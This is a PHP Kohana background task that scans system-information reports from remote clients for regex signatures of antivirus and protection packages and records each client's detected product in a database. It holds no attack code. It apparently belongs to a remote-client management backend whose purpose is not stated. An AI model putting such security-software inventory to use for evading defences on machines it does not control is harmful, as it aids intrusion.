<?php defined('SYSPATH') or die('No direct script access.');

class Task_Update_Av extends Minion_Task{
    
    protected function _execute(array $params){
        Task_Helper::prepare();
        $templates = Kohana::$config->load('sysinfo.protection.packages');

        $sql = DB::select('id', 'client_id', 'data')
            ->from('module_data')
            ->and_where('ctl', '=', 'GetSystemInfo')
            ->and_where('name', '=', 'systeminfo')
            ->and_where('id', '>', Helper::getCounter('av'))
            ->and_where_open();

        foreach($templates as $template){
            foreach ($template['regexs'] as $regex){
                $sql->or_where(DB::expr("encode(data, 'escape')"), '~', $regex);
            }
        }
        $records = $sql->and_where_close()
            ->order_by('id')
            ->limit(2000)
            ->execute()
            ->as_array();

        foreach ($records as $record){
            foreach($templates as $template){
                foreach ($template['regexs'] as $regex){
                    if(preg_match('#'.$regex.'#', pg_unescape_bytea($record['data']))){
                        $av = DB::select('id')
                            ->from('av')
                            ->where('client_id', '=', $record['client_id'])
                            ->execute()
                            ->current();

                        if($av){
                            DB::update('av')
                                ->set(['name' => $template['title']])
                                ->where('client_id', '=', $record['client_id'])
                                ->execute();
                        }else{
                            DB::insert('av', ['name', 'client_id'])
                                ->values([
                                    'name' => $template['title'],
                                    'client_id' => $record['client_id']
                                ])->execute();
                        }
                    }
                }
            }
        }

        if($records){
            Helper::updCounter(end($records)['id'], 'av');
        }else{
            sleep(5);
        }
    }

}